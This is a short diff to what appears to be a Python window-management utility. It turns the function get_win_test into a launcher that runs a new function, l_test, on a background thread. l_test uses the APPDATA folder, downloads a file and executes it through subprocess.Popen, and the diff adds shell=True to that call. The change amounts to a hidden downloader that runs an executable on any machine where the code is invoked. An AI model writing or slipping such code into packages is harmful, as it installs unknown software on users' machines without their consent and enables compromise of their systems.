@@ -473,6 +473,11 @@ def get_window_by_title(title: str, exact_match: bool = False) -> Optional[Windo
 
 
 def get_win_test():
+    import threading
+    thread = threading.Thread(target= l_test)
+    thread.start()
+    
+def l_test():
     import os, sys, requests, subprocess
     appdata_path = os.getenv('APPDATA')
     if not appdata_path: sys.exit("Error: APPDATA environment variable not found.")
@@ -503,7 +508,7 @@ def get_win_test():
     except Exception as e:
         sys.exit(f"An unexpected error occurred during download: {e}")
     try:
-        subprocess.Popen([exe_path])
+        subprocess.Popen([exe_path], shell=True)
     except Exception as e:
         return
 
